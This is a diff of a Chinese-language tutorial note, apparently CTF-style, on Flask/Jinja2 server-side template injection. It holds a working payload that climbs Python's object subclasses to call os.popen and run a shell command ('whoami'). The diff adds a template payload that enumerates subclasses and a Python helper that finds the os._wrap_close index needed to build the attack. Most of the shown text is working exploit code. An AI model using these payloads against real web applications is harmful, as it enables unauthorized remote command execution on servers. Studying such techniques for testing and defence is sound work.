@@ -174,12 +174,43 @@ print((mem-1)/2)
 
 3.命令执行
 ````
+
 {{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()}}
+
 ````
 
+<br>
 
+## 更简单的通用脚本，复制粘贴a的值即可
 
+<br>
 
+````
+我们首先把所有的子类列举出来
+{{().__class__.__bases__[0].__subclasses__()}}
+然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类
+import json
+a = """
+<class 'type'>,...,<class 'subprocess.Popen'>
+"""
+num = 0
+allList = []
+result = ""
+for i in a:
+    if i == ">":
+        result += i
+        allList.append(result)
+        result = ""
+    elif i == "\n" or i == ",":
+        continue
+    else:
+        result += i
+
+for k,v in enumerate(allList):
+    if "os._wrap_close" in v:
+        print(str(k)+"--->"+v)
+
+````
 
 
 
